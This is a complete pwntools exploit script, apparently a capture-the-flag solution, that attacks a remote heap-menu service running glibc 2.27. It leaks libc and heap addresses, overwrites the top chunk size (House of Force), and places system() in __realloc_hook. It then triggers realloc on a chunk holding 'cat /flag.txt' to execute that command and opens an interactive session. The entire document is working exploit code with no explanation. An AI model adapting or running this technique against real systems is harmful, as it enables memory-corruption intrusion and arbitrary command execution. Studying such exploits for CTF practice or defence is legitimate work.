from pwn import *


def alloc(idx, size,p):
    p.sendline('1')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    p.readuntil(b"size? ")
    p.sendline(str(size))
def clear(idx):
    p.sendline('2')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
def view(idx):
    p.sendline('3')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    return p.readuntil(b'\n')

def special_view(idx):
    p.sendline('3')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    return p.readline()

def edit(idx, size, content):
    p.sendline('4')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    p.readuntil(b"size? ")
    p.sendline(str(size))
    p.sendline(content)
def realloc(idx, size,p):
    p.sendline('6')
    p.readuntil(b"Where? ")
    p.sendline(str(idx))
    p.readuntil(b"size? ")
    p.sendline(str(size))


# change to point at the real hostname...
p  = remote('gold.b01le.rs', 4001)
#p = process(["/tmp/ld-2.27.so", "./chal"])
#gdb.attach(p)


for i in range(0,16):
    alloc(i, 220,p)
for i in range(0,16,2): # prevent consolidation by freeing every other chunk
    clear(i)
alloc(17,40,p)
### Offsets are for libc 2.27
# chunks[14] == libc leak
leak = view(14)
leak = u64(leak.strip(b'\n') + b'\x00'*2)
libc_base = leak - 0x3afd80 #0x3afca0 - 0xe0
malloc_hook = libc_base + 0x3afc30
log.info("Leak @ " + str(hex(leak)))
log.info("libc base @ " + str(hex(libc_base)))
log.info("malloc hook @ " + str(hex(malloc_hook)))
alloc(18, 400, p)
edit(18, 416, 'a'*408 + "\xff"*8) # overwrite top chunk with very large size
heap_leak = view(12)
heap_leak = u64(heap_leak.strip(b'\n') + b'\x00'*2)
log.info("heap leak @ " + str(hex(heap_leak)))
heap_base = heap_leak - 0xbc0
log.info("heap base @ " + str(hex(heap_base)))
# top chunk = 0x1160 from base
one_gadget = libc_base + 0x41602
system = libc_base + 0x41770  
free_hook = libc_base + 0x3b18e8
initial_offset = libc_base+0x3b0d90
realloc_hook = libc_base+0x3afc28
target_distance = realloc_hook - heap_base - 0x1318
payload =  p64(system)*2
alloc(19, target_distance, p)
shell = b"cat /flag.txt\x00"
edit(17, len(shell), shell)
alloc(20, 400,p)
edit(20, len(payload), payload)
realloc(17, 500,p)

log.info("realloc hook @ " + str(hex(realloc_hook)))
log.info("Attempting to malloc chunk of size "+ str(hex(target_distance)))
log.info("system @ " + str(hex(system)))



p.interactive()
